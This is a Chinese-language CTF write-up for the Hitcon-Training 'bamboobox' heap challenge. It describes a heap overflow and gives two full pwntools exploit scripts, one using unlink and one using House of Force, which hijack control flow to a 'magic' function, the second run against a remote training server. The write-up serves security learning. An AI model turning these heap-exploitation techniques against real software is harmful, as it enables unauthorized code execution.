---
title: bamboobox
categories:
- Hitcon-Training
---
# bamboobox

## 前言

渗透测试真是恼人，WEB好难，被360吊打，还是回来继续学PWN，争取五一刷完Hitcon-Training，这个题不是很难，但是有两种方法可以解，自己做的时候只想到一种，这里记录一下，因为第二种简单太多了。

## 程序逻辑

程序主要有5个功能，Show、Add、Change、Remove和Exit，其中main退出的时候会调用开始malloc的chunk的goodbye_message函数，初步思路是覆盖这个chunk的内容为magic_addr，退出即可

![main](./1.jpg)

Show函数可以用来泄露地址

![show](./2.jpg)

![add](./3.jpg)

![remove](4.jpg)

Change函数里有堆溢出

![change](5.jpg)

## 漏洞利用

### method1

第一种方法是Unlink，先分配3个堆块，构造一个small chunk,chunk的结构如下:
prev_size->0  
size->0x20  
fd:p-0x18  
bk:p-0x10  
prev_size->0x20(绕过next_chunk的size检查)
nextchunk_prev_size->0x30(定位到fake chunk)
next_chunk_size->size(末尾为0,表明为空闲块)

### method2

第二个方法是House of Force，在wiki里学过，思路是先分配一个chunk，溢出到top_chunk，改为
prev_size:0
size:-1
之后Malloc(-distance)，distance是top_chunk到第一个chunk的距离，之后再分配chunk就会使用第一个函数所在的chunk，造成覆盖

## exp.py

### unlink.py
```py
#coding=utf-8
from time import sleep
from pwn import *
debug = 0
context.update(arch='amd64',os='linux',log_level="DEBUG")
context.terminal = ['tmux','split','-h']
p = process('./bamboobox')
#elf = ELF('./bamboobox')
#libc = ELF('/lib/i386-linux-gnu/libc.so.6')
if debug:
    gdb.attach(p)

def AddItem(size,content):
    p.recvuntil('Your choice:')
    p.sendline('2')
    p.recvuntil('Please enter the length of item name:')
    p.sendline(str(size))
    p.recvuntil('Please enter the name of item:')
    p.send(content)

def RemoveItem(index):
    p.recvuntil('Your choice:')
    p.sendline('4')
    p.recvuntil('Please enter the index of item:')
    p.sendline(str(index))

def ShowItem():
    p.recvuntil('Your choice:')
    p.sendline('1')

def ChangeItem(index,new_len,content):
    p.recvuntil('Your choice:')
    p.sendline('3')
    p.recvuntil('Please enter the index of item:')
    p.sendline(str(index))
    p.recvuntil('Please enter the length of item name:')
    p.sendline(str(new_len))
    p.recvuntil('Please enter the new name of the item:')
    p.send(content)

def Exit():
    p.recvuntil('Your choice:')
    p.sendline('5')


def exp():
    magic_addr = 0x400d49
    AddItem(0x100,'a'*7+'\n')#idx 0
    AddItem(0x30,'b'*7+'\n')#idx 1
    AddItem(0x80,'c'*7+'\n')#idx 2
    AddItem(0x10,'d'*7+'\n')
    #overflow
    item_list = 0x6020c0
    fd = (item_list+0x18) - 24
    bk = (item_list+0x18) - 16
    payload = p64(0x0)+p64(0x20)+p64(fd)+p64(bk)+p64(0x20)
    payload += (0x30-len(payload)) * 'a'
    payload += p64(0x30)+p64(0x90)
    ChangeItem(1,len(payload),payload)
    RemoveItem(2)
    ChangeItem(1,0x10,'x'*8+p64(item_list+0x38))
    ShowItem()
    p.recvuntil('0 : ')
    heap_base = u64(p.recv(3).ljust(8,'\x00')) - 0x210
    log.success('heap base => ' + hex(heap_base))
    ChangeItem(1,0x20,p64(0x20)+p64(heap_base+0x18))
    ChangeItem(0,0x10,p64(magic_addr))
    Exit()
    p.interactive()

exp()
```

### house-of-force.py

```py
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
from pwn import *

host = "training.pwnable.tw"
port = 11011

r = remote(host,port)

def additem(length,name):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(length))
    r.recvuntil(":")
    r.sendline(name)

def modify(idx,length,name):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))
    r.recvuntil(":")
    r.sendline(str(length))
    r.recvuntil(":")
    r.sendline(name)

def remove(idx):
    r.recvuntil(":")
    r.sendline("4")
    r.recvuntil(":")
    r.sendline(str(idx))

def show():
    r.recvuntil(":")
    r.sendline("1")

magic = 0x400d49
additem(0x60,"ddaa")
modify(0,0x70,"a"*0x60 + p64(0) + p64(0xffffffffffffffff))
additem(-160,"dada")
additem(0x20,p64(magic)*2)
r.interactive()

```
